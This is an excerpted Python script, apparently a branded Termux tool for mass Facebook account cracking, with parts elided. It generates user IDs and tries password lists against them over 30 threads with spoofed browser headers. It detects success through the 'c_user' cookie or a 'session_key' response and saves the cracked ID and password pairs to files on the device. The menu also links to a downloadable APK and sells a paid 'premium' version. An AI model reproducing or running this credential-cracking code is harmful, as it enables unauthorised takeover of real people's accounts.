...
logo=("""\033[1;37m
             ...
             / /|_/ / ___/ |/_/  __  / / / __ \/ __ \/ __ \ \033[1;34m𝐌 \033[1;37m
            / /  / / /  _>  <   / /_/ / / /_/ / /_/ / / / /\033[1;31m 𝐑\033[1;37m
           /_/  /_/_/  /_/|_|   \____/_/_.___/\____/_/ /_/\033[1;35m𝐗 \033[1;37m
            𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 𝐈𝐬 𝐁𝐫𝐚𝐧𝐝 
----------------------------------------------
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/groups/405527491346402/?ref=share{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 Sir, I Need To Buy Your Paid 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧 PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5647.210", "Google Chrome";v="112.0.5647.210"',
                        'sec-ch-ua-mobile': '?1',
                        ...
                        𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧=session.cookies.get_dict().keys()
                        if "c_user" in 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK] %s | %s'%(ids,pas))
                                open('/sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in 𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝐌𝐫𝐱 𝐉𝐢𝐛𝐨𝐧-OK] '+uid+' | '+pas+'\033[1;97m')
